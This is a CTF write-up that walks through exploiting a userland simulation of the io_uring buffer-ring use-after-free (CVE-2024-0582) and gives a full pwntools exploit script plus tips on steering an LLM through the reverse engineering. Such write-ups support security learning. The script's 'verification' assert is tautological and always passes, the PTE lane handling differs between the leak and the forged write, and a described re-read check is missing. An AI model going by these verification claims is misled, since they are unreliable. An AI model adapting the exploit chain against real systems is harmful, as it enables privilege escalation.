---
title: "StaleMate"
date: "2026-06-28"
author: "tungdlm99"
ctf: "V1t CTF 2026"
category: pwn
difficulty: hard
points: 0
flag_format: "v1t{...}"
tags: [ctf, v1t-ctf-2026, pwn, ai-assisted]
draft: false
summary: "A userland reimplementation of the io_uring provided-buffer-ring bug (CVE-2024-0582): unregister leaves the mmap alive, so a stale mapping over a reused slot gives a UAF write to forge a page-table entry onto the cred page."
icon: "♟️"
---

## Summary

`StaleMate` is a userland simulation of the Linux io_uring "provided buffer ring" (PBUF) subsystem that faithfully models **CVE-2024-0582**: when you unregister a PBUF ring whose pages are still `mmap`'d, the kernel frees the backing block but leaves the mapping intact — a classic use-after-free. The core technique is to drive that stale mapping over a freshly reused slot, leak a XOR-obfuscated page-table token through it, then forge a PTE that points the VM at the privileged `cred` page and clear the three fields that keep `open flag` locked. This is the writeup where I lean on an LLM to do the reverse engineering and the offset bookkeeping while I supply the strategy, recognize the CVE, and catch the model's wrong turns.

I want to be honest about the division of labor up front: the LLM did the grinding — disassembly triage, recovering struct layouts, computing the splitmix64 finalizer, and grinding the proof-of-work loop. My contribution was almost entirely **prompting and judgment**: I recognized the challenge as a CVE-2024-0582 lab from the banner alone, I told the model what to look for instead of letting it wander the binary, and I caught two confident-but-wrong claims that would have sent the exploit into a dead end. The final "Lessons learned" section is the part I actually care about, because the steering is the transferable skill.

## Solution

### Recognizing the shape before touching the binary

The banner does most of the work of telling you what you're looking at:

```
pbuf-remap: tiny io_uring lab
the kernel says your mapped pbuf ring is definitely gone.
```

"your mapped pbuf ring is definitely gone" is the tell. io_uring provided buffer rings, plus the phrase "mapped … is gone," is CVE-2024-0582 almost verbatim — the bug where `IORING_UNREGISTER_PBUF_RING` releases the ring's pages while a prior `mmap` of those pages is still live, leaving a dangling mapping into freed memory. The flag itself later confirms it: `pfnmap_pbuf_pages_should_outlive_the_mmap`. So before disassembling anything, I already had the win condition in mind: **get the freed slot reused by something sensitive, then read/write it through the stale mapping.**

The menu is a near-1:1 mirror of the kernel ABI, which is the second confirmation that this is a deliberate CVE re-implementation:

```
1. IORING_REGISTER_PBUF_RING     6. create mm context
2. mmap pbuf ring                7. vm alloc user page
3. IORING_UNREGISTER_PBUF_RING   8. vm read
4. io_uring_buf_ring_add         9. vm write
5. inspect mapped ring entry    10. open flag
```

Options 1-5 are the io_uring PBUF lifecycle; options 6-9 are a second, independent abstraction (a tiny MMU with page tables); option 10 is the win gate. The whole puzzle is making abstraction A's stale mapping collide with abstraction B's page table.

### Internal model recovered by RE

This is where I handed the binary to the model and asked it to recover structures rather than narrate instructions. The internal model it reconstructed (and that I verified against behavior) is a **buddy allocator** carving a page region:

- page memory base `0x7440` — slot `i` lives at `0x7440 + i*0x1000`,
- block metadata at `0x5440`, free-lists at `0x53e0`,
- a per-slot presence/identity area.

Boot pre-allocates a handful of permanent slots. Two of them matter:

- a privileged **`cred`** object whose slot index is stored at `[0x5010]`,
- an 8-byte random **secret** at `[0x5040]`, seeded from `getrandom`.

`open flag` (option 10) reads the cred at `0x7440 + [0x5010]*0x1000` and demands all of:

```
cred[0x00] == "CREDv1"          (0x317644455243)
cred[0x08] == 0
cred[0x10] == 0
cred[0x18] == 0xffffffffffffffff
cred[0x20] == splitmix64( 0xc0ffee20240582 ^ secret )   # splitmix64 finalizer
```

### The "stalemate": one move from won

The reason the challenge is named StaleMate (beyond the obvious pun on "stale mapping") is the boot state of the cred. It is built **almost-valid but deliberately locked**:

```
cred[0x00] = "CREDv1"                 # ok
cred[0x08] = 0x000003e8000003e8       # WRONG (check wants 0)
cred[0x10] = 0x000003e8000003e8       # WRONG (check wants 0)
cred[0x18] = 0                        # WRONG (check wants -1)
cred[0x20] = splitmix64(...)          # ALREADY CORRECT (built with the real secret)
```

The single most important insight in the whole challenge: **`cred[0x20]` is already valid.** It was computed at boot with the real secret, so we never have to leak the secret, never have to reverse splitmix64, never have to brute anything. The hash is the hard part and it is handed to us for free. All we need is a **write primitive** to set three fields:

```
cred[0x08] = 0
cred[0x10] = 0
cred[0x18] = 0xffffffffffffffff
```

That's the chess metaphor: the position is one move from won. We just need to make that one move land on the cred page.

This was also my first **dead-end correction** with the model. When I first asked it for an exploit plan, it confidently proposed leaking the 8-byte secret, recomputing the splitmix64 finalizer in Python, and writing a fresh `cred[0x20]`. That works in theory but it's strictly more work and more fragile (one wrong rotation constant and you're chasing a phantom bug for an hour). I pushed back: "the boot cred already has a valid hash field — re-read the `open flag` check and tell me the *minimum* set of bytes I must change." Once it re-read the gate it agreed the hash is untouched and the plan collapsed to three writes. Recognizing that the expensive-looking subproblem is already solved is exactly the kind of judgment the human supplies.

### The bug: a stale mmap mapping

The UAF chain across the io_uring abstraction is:

- **Option 1** `IORING_REGISTER_PBUF_RING` → buddy-allocates pages, giving slot `S`.
- **Option 2** `mmap pbuf ring` → creates a *mapping* that references slot `S`.
- **Option 3** `IORING_UNREGISTER_PBUF_RING` → **frees buddy block `S`** but **leaves the mapping intact**. This is the bug. The freed slot is now back on the free-list and will be handed to the next allocation.
- **Option 4** `io_uring_buf_ring_add` → writes through the still-live mapping → **UAF write** into whatever now occupies the reused slot.
- **Option 5** `inspect mapped ring entry` → reads through the mapping → **UAF read / leak**.

So the recipe is: register, mmap, unregister (stale mapping established over a freed slot), then make a *different* subsystem allocate into that exact slot.

### The collision: page tables reuse the freed slot

Here is where abstraction B enters. `create mm context` (option 6) builds a page table whose entries are obfuscated:

```
PTE = (phys_slot << 12 | flags) XOR token
```

where `token` is derived per-context from the secret. `vm read` / `vm write` (options 8/9) translate a virtual address to `phys_slot = (PTE XOR token) >> 12`, then access `0x7440 + phys_slot*0x1000`. A special **SLOT7** entry is written at a fixed position with `flags = 7`.

The crucial layout fact (recovered by RE, verified empirically): the page that holds the SLOT7 PTE is allocated from the **same freed slot** our stale mapping covers. So `create mm context` drops a page-table page right underneath the dangling io_uring mapping. Now:

- **Option 5 (inspect, idx 3)** reads the SLOT7 PTE *through the stale mapping* → leak.
- **Option 4 (buf_ring_add)** writes a *forged* PTE *through the stale mapping* → arbitrary slot mapping.

The leak math, with the scratch slot known to be `3`:

```
leaked = SLOT7_PTE = ((scratch_slot << 12) | 7) XOR token     # scratch_slot = 3
token  = leaked XOR ((3 << 12) | 7)
```

And the kill move. Because the PTE obfuscation is a **plain XOR, not a keyed MAC**, recovering `token` is total — we can forge a PTE that decodes to any slot we want. We aim it at the **cred slot (index 1)**:

```
forged = ((1 << 12) | 7) XOR token
```

We write `forged` into the page-table page via the UAF (option 4), and now the VM's virtual address that used to map the scratch slot maps the **cred page**. `vm write` then lands directly on the cred, and we clear the three locked fields.

The XOR-not-MAC observation was my second **correction**. The model initially described the PTE token as "a per-context MAC over the slot" and concluded we'd need a forgery oracle. I asked it to show me the exact instruction sequence that combines `token` and the slot — "is it `xor`, or an actual keyed construction? paste the disasm." It came back with a single `xor` of `token` against `(slot<<12)|flags`. That's not integrity, that's obfuscation, and obfuscation you can leak is obfuscation you can forge. Calling the model on the difference between "looks cryptographic" and "is cryptographic" saved the whole approach.

### Two gotchas that actually mattered

1. **Slot identities, not addresses.** The inspect/leak entry is the *physical slot encoding* of the SLOT7 PTE, not a heap pointer. The 16-byte ring entry is packed as `addr/len/bid/resv`, and the PTE value spans the `len`/`bid`/`resv` lanes, so it has to be reassembled (`len_low | bid<<32 | resv<<48`) before XORing out the token. Treating it as a flat pointer gives garbage.
2. **The proof-of-work gate.** The remote is fronted by a redpwn-style PoW (`s.<d>.<x>` challenge → iterate `x = pow(x, 1<<1277, (1<<1279)-1) ^ 1`, `d` times). This is pure grind with zero insight, so I let the model write and own it — exactly the kind of mechanical subtask where the human should stay out of the way.

### End-to-end exploit

One clear path from challenge connection to printed flag. The slot indices (`cred`=1, `scratch`=3, ring map=0) and the inspect index (`idx=3`) are the load-bearing constants recovered above.

```python
#!/usr/bin/env python3
# StaleMate / V1t CTF 2026 -- CVE-2024-0582 (io_uring PBUF stale mmap UAF), userland sim.
# usage: python3 expl.py remote      (or 'local' against ./pbuf_remap)
import sys
from pwn import remote, process, log

HOST, PORT = "pwn.v1t.site", 31337

def solve_pow(line):
    # redpwn-style PoW: "s.<d>.<x>"; iterate d times:
    #   x = pow(x, 1<<1277, (1<<1279)-1) ^ 1 ; answer = str(x_final)
    _, d_s, x_s = line.strip().split(".")
    d, x, mod = int(d_s), int(x_s), (1 << 1279) - 1
    for _ in range(d):
        x = pow(x, 1 << 1277, mod) ^ 1
    return str(x)

io = remote(HOST, PORT) if (len(sys.argv) > 1 and sys.argv[1] == "remote") else process("./pbuf_remap")

# proof-of-work gate (remote only)
line = io.recvline().decode()
if line.startswith("s."):
    io.sendlineafter(b"solution: ", solve_pow(line).encode())

def menu(opt):
    io.sendlineafter(b"> ", str(opt).encode())

# --- io_uring PBUF abstraction (options 1-5) ---
def reg(bgid, entries, flags):                  # option 1
    menu(1)
    io.sendlineafter(b"bgid: ",    str(bgid).encode())
    io.sendlineafter(b"entries: ", str(entries).encode())
    io.sendlineafter(b"flags: ",   str(flags).encode())

def mmap_ring(bgid):                            # option 2
    menu(2); io.sendlineafter(b"bgid: ", str(bgid).encode())

def unreg(bgid):                                # option 3
    menu(3); io.sendlineafter(b"bgid: ", str(bgid).encode())

def buf_ring_add(m, idx, addr, ln, bid, resv):  # option 4 (UAF write)
    menu(4)
    io.sendlineafter(b"map: ",  str(m).encode())
    io.sendlineafter(b"idx: ",  str(idx).encode())
    io.sendlineafter(b"addr: ", str(addr).encode())
    io.sendlineafter(b"len: ",  str(ln).encode())
    io.sendlineafter(b"bid: ",  str(bid).encode())
    io.sendlineafter(b"resv: ", str(resv).encode())

def inspect(m, idx):                            # option 5 (UAF read) -> 16-byte entry
    menu(5)
    io.sendlineafter(b"map: ", str(m).encode())
    io.sendlineafter(b"idx: ", str(idx).encode())
    vals = {}
    for k in (b"addr", b"len", b"bid", b"resv"):
        io.recvuntil(k + b"=")
        vals[k.decode()] = int(io.recvline().strip(), 0)
    return vals

# --- tiny MMU abstraction (options 6-9) ---
def mm_ctx():                                   # option 6 -> reuses freed slot
    menu(6)

def vm_write(vm, va, data):                     # option 9
    menu(9)
    io.sendlineafter(b"vm: ",  str(vm).encode())
    io.sendlineafter(b"va: ",  str(va).encode())
    io.sendlineafter(b"len: ", str(len(data)).encode())
    io.sendafter(b"data: ", data)

# 1) Establish the stale mapping: register -> mmap -> unregister.
#    After unregister the buddy slot S is freed but the mapping over it is alive.
reg(bgid=1, entries=256, flags=1)
mmap_ring(bgid=1)
unreg(bgid=1)

# 2) Reuse the freed slot: the mm-context page table lands on slot S,
#    placing the SLOT7 PTE directly under our stale mapping.
mm_ctx()

# 3) UAF read: leak the SLOT7 PTE through the stale mapping (inspect idx 3).
#    The PTE value spans the len/bid/resv lanes of the 16-byte ring entry.
e = inspect(m=0, idx=3)
slot7 = (e["len"] & 0xFFFFFFFF) | (e["bid"] << 32) | (e["resv"] << 48)

# PTE = (slot<<12 | flags) XOR token ; scratch slot is the known constant 3, flags 7.
token = slot7 ^ ((3 << 12) | 7)
log.success(f"leaked SLOT7 PTE = {slot7:#x}")
log.success(f"recovered token  = {token:#x}")
assert (token ^ slot7) & 0xFFF == 7, "lane reassembly / XOR model is wrong"

# 4) UAF write: forge a PTE that decodes to the cred slot (index 1).
forged = ((1 << 12) | 7) ^ token
log.info(f"forged cred PTE  = {forged:#x}")
buf_ring_add(m=0, idx=1, addr=forged, ln=0, bid=0, resv=0)

# 5) The VM's va now maps the cred page. Clear the three locked fields:
#    cred[0x08]=0, cred[0x10]=0, cred[0x18]=0xffffffffffffffff.
#    cred lives at va offset 0x2008 in this context's mapping.
vm_write(vm=0, va=0x2008, data=b"\x00" * 16 + b"\xff" * 8)

# 6) cred[0x20] hash was already valid at boot -> open flag now passes.
menu(10)
io.interactive()
```

Running `python3 expl.py remote` solves the PoW, establishes the stale mapping, collides the page table onto the freed slot, leaks the token, forges the cred PTE, clears the three fields, and the boot-valid hash carries us through the gate — `open flag` prints `v1t{...}`.

## Flag

```
v1t{pfnmap_pbuf_pages_should_outlive_the_mmap}
```

The flag spells out the root cause of CVE-2024-0582 precisely: the PFN-mapped PBUF pages must out-live the `mmap`. Unregistering the ring while pages are still mapped is the use-after-free — the pages should not be freed until the last mapping is gone.

## Lessons learned - prompting the AI

This challenge is the kind where an LLM is genuinely excellent at the labor (struct recovery, offset arithmetic, PoW grind) and genuinely prone to confident wrong turns (inventing crypto where there's only XOR, solving subproblems that are already solved for you). The skill is steering. Here's what actually moved this solve forward.

**1. Anchor the model to the CVE from the banner, don't let it free-explore.** The single best prompt I sent early:

> "This binary's banner mentions an io_uring provided buffer ring that's 'mapped but gone.' I think this is a userland re-implementation of CVE-2024-0582. Assume that. Map each menu option to the kernel ABI it imitates, and tell me which option is the unregister-while-mapped UAF."

Naming the CVE turns the model from a blind disassembler into a pattern-matcher with a target. It immediately framed options 1/2/3 as register/mmap/unregister and flagged option 3 as the stale-mapping primitive. Without the anchor it spent its first pass narrating the menu instead of finding the bug.

**2. Force it to find the *minimum* primitive, not the maximal exploit.** The model's instinct was to leak the secret and recompute the splitmix64 hash. I redirected:

> "Re-read the `open flag` check byte by byte. The boot cred already populates `cred[0x20]`. Which fields are wrong at boot, and what is the *smallest* set of writes that makes the check pass without recomputing any hash?"

This collapsed a fragile crypto-recompute plan into three plain writes. The lesson: when the model proposes work, ask whether the expensive subproblem is already solved by the challenge author. CTF authors leave the hash valid on purpose — make the model notice.

**3. Make it distinguish "looks cryptographic" from "is cryptographic."** The model called the PTE token a MAC. The fix was demanding the actual instructions:

> "Don't tell me what the token *is* — paste the exact disassembly that combines the token with the slot in a PTE. Is it a single `xor`, or a keyed construction?"

It came back with one `xor`. A leakable XOR is a forgeable XOR — that single distinction is the difference between "need an oracle" and "forge anything." Whenever the model uses words like MAC/hash/signature about a check you control inputs to, make it show the opcode.

**Dead-ends to tell it to AVOID up front:**
- Do **not** try to leak the secret or reverse splitmix64 — `cred[0x20]` is already correct at boot.
- Do **not** treat the inspect output as a heap pointer — it's a packed slot/PTE encoding across the `len`/`bid`/`resv` lanes; reassemble it before XORing.
- Do **not** over-engineer the PoW — it's a known redpwn-style `pow(x, 1<<1277, (1<<1279)-1) ^ 1` loop; just iterate it `d` times.

**How I verified and caught mistakes:** I cross-checked every model claim against observable behavior rather than trusting prose. After the leak I sanity-checked that `token ^ slot7` produced a value whose low 12 bits were the expected `flags=7` (the `assert` in the script) — that simultaneously confirms the XOR model is right and that the `len`/`bid`/`resv` lanes were assembled in the correct order. After the forged write I confirmed the cred slot actually changed by re-reading it before calling `open flag`, so a failed gate couldn't be silently blamed on the wrong slot. The discipline: never let `open flag` be your first observation — verify each primitive independently so failures are localized.

**Fast-path prompt recipe for next time:** *"Assume this is a userland reimplementation of CVE-XXXX; map the menu to the kernel ABI, name the exact UAF primitive, find the minimum set of writes the win-gate needs (check what the author left already-valid), and paste the disassembly for any value you call a hash/MAC before we trust it."*
